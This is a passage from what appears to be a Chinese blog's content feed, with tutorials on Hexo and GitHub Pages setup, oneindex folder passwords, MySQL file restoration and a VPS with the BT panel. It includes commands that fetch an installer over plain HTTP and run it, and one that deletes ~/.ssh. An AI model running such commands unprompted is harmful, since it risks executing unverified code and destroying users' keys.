data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123332.png" class="lozad"></p><p>在目录C:\Users\Administrator.ssh下载，找到下面两文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123344.png" class="lozad"></p><p>用记事本打开id_rsa.pub，复制里面的内容</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123355.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123407.png" class="lozad"></p><p>添加成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123421.png" class="lozad"></p><p>继续在Git bash中输入ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> 然后输入两次yes，返回下图说明连接成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123432.png" class="lozad"></p><h2 id="2-2-自定义域名设置"><a href="#2-2-自定义域名设置" class="headerlink" title="2.2 自定义域名设置"></a>2.2 自定义域名设置</h2><p>在Blog的source目录下，新建一个CANME文件，具体操作如下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123442.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123452.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123503.png" class="lozad"></p><p>在cmd窗口中输入ping 用户名.github.io 得到GitHub分配的一个公网ip地址，记下这个地址</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123639.png" class="lozad"></p><p>##2.3 设置域名解析</p><p>然后到阿里云购买好的域名中心，设置域名解析，下面是设置好的结果</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123653.png" class="lozad"></p><p>设置步骤：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123702.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123711.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123740.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123750.png" class="lozad"></p><p>##2.4 配置部署</p><p>在Blog的根目录下，找到_config.yml文件，修改repo值（在末尾）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123814.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123823.png" class="lozad"></p><p>在Git bash中输入hexo new post “test”</p><p>这时，可以在source文件下的_posts文件夹中看到刚刚新建的test文件，写文章可以直接在该文档中去写</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123842.png" class="lozad"></p><p>在生成以及部署文章之前，需要安装一个扩展：</p><blockquote><p>npm install hexo-deployer-git –save</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123850.png" class="lozad"></p><p>使用编辑器编好文章，那么就可以使用命令：hexo g 来生成静态的文档</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123919.png" class="lozad"></p><p>然后使用hexo d 来部署到GitHub中</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123924.png" class="lozad"></p><p>如果点击login后dos界面没有反应，按一下enter键就好了</p><p>出现下图，部署成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123932.png" class="lozad"></p><h1 id="0x03-美化博客"><a href="#0x03-美化博客" class="headerlink" title="0x03 美化博客"></a>0x03 美化博客</h1><h2 id="3-1-跟换主题"><a href="#3-1-跟换主题" class="headerlink" title="3.1 跟换主题"></a>3.1 跟换主题</h2><p>1.可以直接去hexo官方主题库中去找一个自己喜欢的主题去下载，然后下载完成后复制到themes文件夹下。<a href="https://hexo.io/themes/" target="_blank" rel="noopener">传送门</a></p><p>2.在Blog目录下，右击，点击Git bash here，然后输入</p><p>git clone <a href="https://github.com/shenliyang/hexo-theme-snippet.git" target="_blank" rel="noopener">https://github.com/shenliyang/hexo-theme-snippet.git</a> </p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101124044.png" class="lozad"></p><h2 id="3-2-博客导航栏设置"><a href="#3-2-博客导航栏设置" class="headerlink" title="3.2 博客导航栏设置"></a>3.2 博客导航栏设置</h2><p>直接在博客主题目录下设置即可，在zh-CN中设置也可以。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63rxz6chbj20dz06y74j.jpg" class="lozad"></p><p>​    效果显示</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101124121.png" class="lozad"></p><h2 id="3-3-分类设置"><a href="#3-3-分类设置" class="headerlink" title="3.3 分类设置"></a>3.3 分类设置</h2><p>虽然我们在主题中设置了导航栏，但是却没有给导航栏设置对应的页面，所以点击的时候是不能正常显示的。</p><h3 id="3-3-1-添加分类列表"><a href="#3-3-1-添加分类列表" class="headerlink" title="3.3.1 添加分类列表"></a>3.3.1 添加分类列表</h3><p>在项目根目录下，执行下面的命令行，新建分类页面，然后会在项目根目录下的 <strong>source</strong> 文件夹中新建一个 <strong>categories</strong> 文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s2yji4qj20gy0aoq3e.jpg" class="lozad"></p><p>打开 <strong>categories</strong> 文件夹中的 <strong>index.md</strong> 文件，添加 <strong>type</strong> 字段，设置为 <strong>“categories”</strong>。如下图所示。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s3sxxtuj20bt04g745.jpg" class="lozad"></p><p>接着到主题文件夹下的 _config.yml 配置文件下，找到 <strong>menu</strong> 模块，把 <strong>categories</strong> 的注释给去掉。如下图所示。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s4q4qq9j20ek06bwep.jpg" class="lozad"></p><p>刷新页面（如果刷新没效果，可以重启服务），可以在页面左侧栏上看到多了一个“分类”列表。</p><h3 id="3-3-2-如何将文章添加到对应分类？"><a href="#3-3-2-如何将文章添加到对应分类？" class="headerlink" title="3.3.2 如何将文章添加到对应分类？"></a>3.3.2 如何将文章添加到对应分类？</h3><p>文章发布前，在 front-matter 部分，多写一个 <strong>categories</strong> 字段，然后参数写上类别的名称，保存后重启服务，在网页上点击“分类”，可以看到分类下已经生成了刚刚设置的类别，并把刚刚发布的文章归类在此类别下。如下图所示。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s656g6xj20em091glo.jpg" class="lozad"></p><h2 id="3-4-标签设置"><a href="#3-4-标签设置" class="headerlink" title="3.4 标签设置"></a>3.4 标签设置</h2><p>方法跟分类设置原理一样，这里就不在重复介绍了，需要注意一点的是格式问题。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s81nzjlj20d705cjra.jpg" class="lozad"></p><h2 id="3-5-Hexo-博客添加站内搜索"><a href="#3-5-Hexo-博客添加站内搜索" class="headerlink" title="3.5 Hexo 博客添加站内搜索"></a>3.5 Hexo 博客添加站内搜索</h2><p>蝴蝶主题支持Algolia，Local Search，这就给大家介绍一些Local Search，因为这个配置简单，-&gt; -&gt;。注意：安装的时候要是项目根目录下安装。</p><p>安装 hexo-generator-search</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>安装 hexo-generator-searchdb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure><p>在项目根目录下的 _config.yml 配置文件的文末添加下面这段代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><p>编辑主题文件夹的 _config.yml 配置文件，设置 Local searchenable 为 <strong>ture</strong>。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63siez3j3j20la068mxd.jpg" class="lozad"></p><p>效果图</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sixkh8fj20l20c9wi4.jpg" class="lozad"></p><h1 id="0x04-其他功能"><a href="#0x04-其他功能" class="headerlink" title="0x04 其他功能"></a>0x04 其他功能</h1><h1 id="0x05-采坑指南"><a href="#0x05-采坑指南" class="headerlink" title="0x05 采坑指南"></a>0x05 采坑指南</h1><h2 id="5-1-端口占用问题"><a href="#5-1-端口占用问题" class="headerlink" title="5.1 端口占用问题"></a>5.1 端口占用问题</h2><p>假如页面一直无法跳转，那么可能端口被占用了。此时我们<code>ctrl+c</code>停止服务器，接着输入<code>“hexo server -p 端口号”</code>来改变端口号</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sltc3yfj20g0045mx1.jpg" class="lozad"></p><h2 id="5-2-npm-install-hexo-g出现问题"><a href="#5-2-npm-install-hexo-g出现问题" class="headerlink" title="5.2 npm install hexo -g出现问题"></a>5.2 npm install hexo -g出现问题</h2><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sm9gnpfj20k004mt8u.jpg" class="lozad"></p><p>解决方法：</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63smjyd3bj20iq03oq31.jpg" class="lozad"></p><p>然后再次执行<code>npm install hexo  -g</code></p><h2 id="5-3-ssh-key配置失败"><a href="#5-3-ssh-key配置失败" class="headerlink" title="5.3 ssh-key配置失败"></a>5.3 ssh-key配置失败</h2><p>首先，清除所有的<code>key-pair</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -D</span><br><span class="line">rm -r ~/.ssh</span><br></pre></td></tr></table></figure><p>删除你在<code>github</code>中的<code>public-key</code>,重新生成<code>ssh</code>密钥对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;</span><br></pre></td></tr></table></figure><p>接下来正常操作</p><p>在<code>github</code>上添加公钥<code>public-key</code>:</p><p>1、首先在你的终端运行<code>xclip -sel c ~/.ssh/id_rsa.pub</code>将公钥内容复制到剪切板</p><p>2、在<code>github</code>上添加公钥时，直接复制即可</p><p>3、保存</p><p>删除你在<code>github</code>中的<code>public-key</code></p><p>重新生成<code>ssh</code>密钥对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;</span><br></pre></td></tr></table></figure><p>测试：</p><p>在终端 <code>ssh -T git@github.com</code></p><h2 id="5-4-发布文章时出现问题"><a href="#5-4-发布文章时出现问题" class="headerlink" title="5.4 发布文章时出现问题"></a>5.4 发布文章时出现问题</h2><p>###5.4.1 问题描述</p><p>使用<code>hexo d -g</code>命令发布文章使，出现如下问题</p><p>YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1:</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sqhgmawj20mq0a03yu.jpg" class="lozad"></p><h3 id="5-4-2-问题原因"><a href="#5-4-2-问题原因" class="headerlink" title="5.4.2 问题原因"></a>5.4.2 问题原因</h3><p>在发布文章的<code>md</code>文件里面开头的文件头没有加空格如下：</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sr6vxpbj20ho052t8v.jpg" class="lozad"></p><h3 id="5-4-3-解决方法"><a href="#5-4-3-解决方法" class="headerlink" title="5.4.3 解决方法"></a>5.4.3 解决方法</h3><p>加上空格后，重新编译，没有出错（记得保存）</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63srtnqhrj20cl05h74a.jpg" class="lozad"></p><p>重新编译，完成部署</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63ss3rwp9j20f1073q2z.jpg" class="lozad"></p><h2 id="5-5-输入hexo-generate或者其他hexo的命令时出现下面的问题"><a href="#5-5-输入hexo-generate或者其他hexo的命令时出现下面的问题" class="headerlink" title="5.5 输入hexo generate或者其他hexo的命令时出现下面的问题"></a>5.5 输入hexo generate或者其他hexo的命令时出现下面的问题</h2><h3 id="5-5-1-问题描述"><a href="#5-5-1-问题描述" class="headerlink" title="5.5.1 问题描述"></a>5.5.1 问题描述</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63ssmzdxej20jy0dlwfq.jpg" class="lozad"></p><h3 id="5-5-2-问题原因"><a href="#5-5-2-问题原因" class="headerlink" title="5.5.2 问题原因"></a>5.5.2 问题原因</h3><p>yml的配置文件中国，冒号后面需要有空格，如下：</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63stb003fj20ly03edfu.jpg" class="lozad"></p><h3 id="5-5-3-解决方法"><a href="#5-5-3-解决方法" class="headerlink" title="5.5.3 解决方法"></a>5.5.3 解决方法</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63stxxxr9j20n1034wee.jpg" class="lozad"></p><p>保存后重新运行，没报错，空格真的是大坑。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sudywlzj20cw02pjr8.jpg" class="lozad"></p><h2 id="5-6-部署博客没有CSS"><a href="#5-6-部署博客没有CSS" class="headerlink" title="5.6 部署博客没有CSS"></a>5.6 部署博客没有CSS</h2><h3 id="5-6-1-问题描述"><a href="#5-6-1-问题描述" class="headerlink" title="5.6.1 问题描述"></a>5.6.1 问题描述</h3><p>在本地server成功，显示没有问题</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63szsvf18j20it0aztcu.jpg" class="lozad"></p><p>但是部署到github上之后，就无法显示主题和图片了</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sz41tkij20zi0r6go5.jpg" class="lozad"></p><h3 id="5-6-2-解决方法"><a href="#5-6-2-解决方法" class="headerlink" title="5.6.2 解决方法"></a>5.6.2 解决方法</h3><p>更改一下_config.yml文件，其中的url和root属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ur: http://www.nideyuming.com/blog/</span><br><span class="line">root: /blog</span><br></pre></td></tr></table></figure><p>root 下面应该设置成 /你的项目名 而不是/</p><p>然后重新部署一下就成功了。</p><h2 id="5-7-GitHub配置个人域名出现问题"><a href="#5-7-GitHub配置个人域名出现问题" class="headerlink" title="5.7 GitHub配置个人域名出现问题"></a>5.7 GitHub配置个人域名出现问题</h2><h3 id="5-7-1-问题描述"><a href="#5-7-1-问题描述" class="headerlink" title="5.7.1 问题描述"></a>5.7.1 问题描述</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sy0dtlxj20tr0kvq4a.jpg" class="lozad"></p><h3 id="5-7-2-解决方法"><a href="#5-7-2-解决方法" class="headerlink" title="5.7.2  解决方法"></a>5.7.2  解决方法</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t0ljwbpj20sz0lk76b.jpg" class="lozad"></p><h2 id="5-8-npm-install安装依赖出现问题"><a href="#5-8-npm-install安装依赖出现问题" class="headerlink" title="5.8 npm install安装依赖出现问题"></a>5.8 npm install安装依赖出现问题</h2><h3 id="5-8-1-问题描述"><a href="#5-8-1-问题描述" class="headerlink" title="5.8.1 问题描述"></a>5.8.1 问题描述</h3><p>npm WARN <a href="mailto:babel-eslint@10.0.1" target="_blank" rel="noopener">babel-eslint@10.0.1</a> requires a peer of eslint@&gt;= 4.12.1 but none is installed. You must install peer dependencies yourself.</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t1gkedpj20k206sjrx.jpg" class="lozad"></p><h3 id="5-8-2-解决方法"><a href="#5-8-2-解决方法" class="headerlink" title="5.8.2 解决方法"></a>5.8.2 解决方法</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t24qb2hj20mx0cpae4.jpg" class="lozad"></p><p>##5.9 输入自己后买的域名后访问是404</p><h3 id="5-9-1-问题描述"><a href="#5-9-1-问题描述" class="headerlink" title="5.9.1 问题描述"></a>5.9.1 问题描述</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t30fnfkj20r20dv3yx.jpg" class="lozad"></p><p>但是使用github的默认域名可以正常访问，所以问题出在了域名解析和站点配置的问题上了</p><p>先考虑重置设置一下域名解析的记录，将</p><p>重新设置好了域名解析，但是还是出现404，我TM。。。。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t3frgu7j20p60ht0t5.jpg" class="lozad"></p><p>行，那就是站点配置上面的错误了，在<code>hexo</code>生成的博客的<code>source</code>目录下新建一个 <code>CNAME</code> 文件，然后在这个文件中填入你的域名，这样就不会每次发布之后，<code>gitpage</code>里的 <code>customdomain</code>都被重置掉啦。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t3yrcdxj20hx08ht8z.jpg" class="lozad"></p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t47u135j20ff03mgle.jpg" class="lozad"></p><p>重新部署后，在<code>GitHub</code>中会出现<code>CNAME</code>，说明设置成功了</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t4g3nx8j211s0453yo.jpg" class="lozad"></p><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengxiongZz/p/7707219.html</a></p><p><a href="https://www.simon96.online/2018/10/12/hexo-tutorial/" target="_blank" rel="noopener">https://www.simon96.online/2018/10/12/hexo-tutorial/</a></p><p><a href="https://blog.csdn.net/liuyongshun2/article/details/54629087" target="_blank" rel="noopener">https://blog.csdn.net/liuyongshun2/article/details/54629087</a></p><p><a href="https://jerryc.me/posts/21cfbf15/#快速開始" target="_blank" rel="noopener">https://jerryc.me/posts/21cfbf15/#%E5%BF%AB%E9%80%9F%E9%96%8B%E5%A7%8B</a></p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>oneindex后续</title>
      <link href="/2019/08/16/oneindex%E5%90%8E%E7%BB%AD/"/>
      <url>/2019/08/16/oneindex%E5%90%8E%E7%BB%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    在前一篇文章《<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/#more](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/#more)">使用onedrive+oneindex打造一个专属个人网盘</a>》中，我们已经成功的搭建好了一个网盘了，但是这还不算完美，还需要增加一些小细节，比如文件夹加密，文件夹描述，云盘底部介绍等等，下面就来给大家讲讲如何实现。</p><a id="more"></a><h1 id="0x01-实现文件夹加密功能"><a href="#0x01-实现文件夹加密功能" class="headerlink" title="0x01 实现文件夹加密功能"></a>0x01 实现文件夹加密功能</h1><p>实现文件夹加密的功能非常简单，原理就是在需要加密的文件夹中创建一个.password的文件，然后在该文件中输入自己需要设置的密码即可。但是，问题来了，我们正常情况下，Windows是不允许创建一个没有名称的文件的，提示如下。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160227.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160239.png" class="lozad"></p><p>那么，该如何解决这个问题尼？ 其实还是有方法的。比如在cmd中使用命令来直接创建该文件，就不会出现这种情况了，具体操作如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Desktop <span class="comment">#切换到桌面</span></span><br><span class="line">echo <span class="number">123456</span> &gt; .password   <span class="comment">#创建.password文件，并将123456写入该文件</span></span><br><span class="line"><span class="comment">#123456就是加密的文章夹密码</span></span><br></pre></td></tr></table></figure><p>.password文件创建好后，可以上传到你想加密的文件夹，当然这个文件也可以复制到其他文件夹，这样就不需要每次重复创建了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160452.png" class="lozad"></p><p>如果想立马看到效果的话，去oneindex后台重新刷新一下缓存，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160503.png" class="lozad"></p><p>再次访问发现成功加密文件夹，需要输入密码才能访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160515.png" class="lozad"></p><p>ps1：这里输入密码访问成功访问后，发现后面就不用再次输入密码了，原因是浏览器记录了缓存信息，再次使用一个新的浏览器打开还是需要密码的，所以不用担心。</p><p>ps2：如果需要实现在加密的文件夹中再加密文件夹，原理还是一样的，也是在需要加密的文件夹中放入.password文件即可，这样的话，就可以给每个不同的私人文件夹放置不同的密码，即使一个文件夹的密码被猜解出来，其他文件夹也还是安全的。</p><h1 id="0x02-网盘底部创建介绍信息"><a href="#0x02-网盘底部创建介绍信息" class="headerlink" title="0x02 网盘底部创建介绍信息"></a>0x02 网盘底部创建介绍信息</h1><p>这个功能实现过程非常的简单，只需要在网盘根目录中新建一个README.md文件即可，然后在该文件中写入自己需要介绍的信息。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160528.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160538.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>如果还有新功能，会在跟新。皮卡皮卡^v^</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oneindex </tag>
            
            <tag> onedrive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何将*.frm，*.MYD和*.MYI格式的文件导入MySQL中</title>
      <link href="/2019/08/14/%E5%A6%82%E4%BD%95%E5%B0%86-frm%EF%BC%8C-MYD%E5%92%8C-MYI%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5MySQL%E4%B8%AD/"/>
      <url>/2019/08/14/%E5%A6%82%E4%BD%95%E5%B0%86-frm%EF%BC%8C-MYD%E5%92%8C-MYI%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5MySQL%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​        在学mysql数据库的时候，可能有小伙伴经常碰到.frm, .MYD，.MYI 的文件，但是却不知道如何还原其中的数据，今天博客也是碰到了一样的问题，经过在晚上一番搜索后，成功还原了，在这里记录一下，然后分享给大家。</p><a id="more"></a><h1 id="0x01-操作步骤"><a href="#0x01-操作步骤" class="headerlink" title="0x01 操作步骤"></a>0x01 操作步骤</h1><p>创建数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE test2</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160418.png" class="lozad"></p><p>执行成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160428.png" class="lozad"></p><p>刷新数据库</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160438.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160448.png" class="lozad"></p><p>利用PHPstudy找到mysql数据库的安装路径，然后找到data文件夹</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160507.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160514.png" class="lozad"></p><p>将<em>.frm，</em>.MYD和*.MYI的文件都复制到刚刚创建的数据库文件夹中</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160704.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160720.png" class="lozad"></p><p>再次回到小海豚中刷新数据库，发现表已经出现了</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160732.png" class="lozad"></p><p>然后，然后就能看到数据库。哇卡卡。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160746.png" class="lozad"></p><h1 id="0x02-踩坑说明"><a href="#0x02-踩坑说明" class="headerlink" title="0x02 踩坑说明"></a>0x02 踩坑说明</h1><p> 我自己在虚拟机中单独安装了mysql5.5的数据库，然后使用小海豚进行连接，但是发现，创建数据库的时候，在mysql的数据库安装文件夹的data中没有出现最新创建的数据库文件夹，。。。。郁闷，为啥每次这些坑都会被我碰到。。。，</p><p>解决方法：我想起来PHPstudy中集成了mysql，于是，我直接卸载了mysql，直接安装了PHPstudy，然后成功还原了数据库。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>onedrive+oneindex打造属于自己的个人网盘</title>
      <link href="/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/"/>
      <url>/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    前几天在别人的博客中看到有自己搭建的个人专属网盘，看起来还不错的样子，然后了解到是用<code>onedrive+oneindex</code>来实现的，所以自己也通过在网上学习一些相关的文章，并且搭建成功了，所以在这里分享一下搭建的流程，一来是给自己的总结，二来是分享给需要的朋友。</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><blockquote><p>环境需求：</p><p>1.vps一个</p><p>2.宝塔面板环境，Nginx，PHP需要5.6以上版本</p><p>3.onedrive 5T空间</p><p>4.oneindex</p><p>5.域名一个</p></blockquote><h2 id="1-1-vps购买"><a href="#1-1-vps购买" class="headerlink" title="1.1 vps购买"></a>1.1 vps购买</h2><p>访问<a href="https://virmach.com/" target="_blank" rel="noopener">vps购买地址</a>选择经济实惠的Linux VPS</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115150902.png" class="lozad"></p><p>然后拉到最底下，选择kvm的vps，当然选择openVZ的也可以。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151430.png" class="lozad"></p><p>选择第一个2.5刀的</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151440.png" class="lozad"></p><p>选择操作系统和带宽</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151554.png" class="lozad"></p><p>选择vps的位置，然后加入购物车</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151601.png" class="lozad"></p><p>结账</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151615.png" class="lozad"></p><p>填写相关信息，然后选择支付宝付款</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151638.png" class="lozad"></p><h2 id="1-2-宝塔面板的安装"><a href="#1-2-宝塔面板的安装" class="headerlink" title="1.2 宝塔面板的安装"></a>1.2 宝塔面板的安装</h2><p><strong>entos</strong>安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install      -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p><strong>Ubuntu/Deepin</strong> 安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash      